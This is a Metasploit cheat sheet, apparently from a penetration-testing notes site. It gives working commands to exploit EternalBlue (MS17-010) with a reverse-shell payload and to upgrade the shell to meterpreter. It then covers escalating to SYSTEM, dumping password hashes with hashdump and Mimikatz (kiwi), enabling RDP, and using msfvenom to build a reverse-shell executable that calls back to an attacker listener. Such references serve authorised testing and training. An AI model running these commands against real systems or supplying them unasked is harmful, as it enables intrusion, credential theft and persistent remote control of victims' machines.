---
title: Metasploit
desc: Provides security vulnerabilities and exploit using payloads. It contains Msfconsole, Msfvenom
tags: [ActiveRecon, Linux]
alts: [ExploitDB, Gobuster, Searchsploit]
website:
render_with_liquid: false
---

## Msfdb

```sh
# Initialize metasploit database
msfdb init
```

<br />

## Msfconsole

```sh
# Start
msfconsole

---

# check database status
msf6 > db_status

# Search exploits from keywords
msf6 > search ms17-010

# Use an exploit
msf6 > use exploit/windows/smb/smb_17_010_eternalblue

# Show options
msf6 exploit(windows/smb/smb_17_010_eternalblue) > options

# Set options
msf6 exploit(windows/smb/smb_17_010_eternalblue) > set rhosts 10.0.0.1
msf6 exploit(windows/smb/smb_17_010_eternalblue) > set lhost 10.0.0.2

# Unset options
msf6 exploit(windows/smb/smb_17_010_eternalblue) > unset rhosts

# Show payloads
msf6 exploit(windows/smb/smb_17_010_eternalblue) > show payloads

# Set payload
msf6 exploit(windows/smb/smb_17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp

# Run exploit
msf6 exploit(windows/smb/smb_17_010_eternalblue) > exploit

# 
# Ctrl + Z to background session
# 
```

<br />

## Meterpreter - An interractive shell

```sh
# Upgrade to meterpreter
msf6 exploit(windows/smb/smb_17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter

# Set session
msf6 exploit(post/multi/manage/shell_to_meterpreter) > set session 1

# Run exploit
msf6 exploit(post/multi/manage/shell_to_meterpreter) > exploit

# Select session for use
msf6 exploit(post/multi/manage/shell_to_meterpreter) > sessions 2

# Display the target machine's info
meterpreter > sysinfo

# Get user who running in the server
meterpreter > getuid

# Attempt to elevate your privileges
meterpreter > getsystem

# Get privileges of current user
meterpreter > getprivs

# Move to the target shell
meterpreter > shell

# Dump all passwords on the machine
meterpreter > hashdump

# Load a new version of Mimikatz
meterpreter > load kiwi

# Check if the target is a virtual machine
meterpreter > run post/windows/gather/checkvm

# Collect local exploits
meterpreter > run post/multi/recon/local_exploit_suggester

# Enable RDP
meterpreter > run post/windows/manage/enable_rdp

```

<br />

## Msfvenom - Standalone payload generator

```sh
# Get payloads
msfvenom -l payloads
msfvenom -l payloads | grep windows | grep reverse | grep shell

# Show options
msfvenom -p windows/shell_reverse_tcp --list-options

# Set options and execute
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.62.234 LPORT=4444 -f exe > rshell.exe
```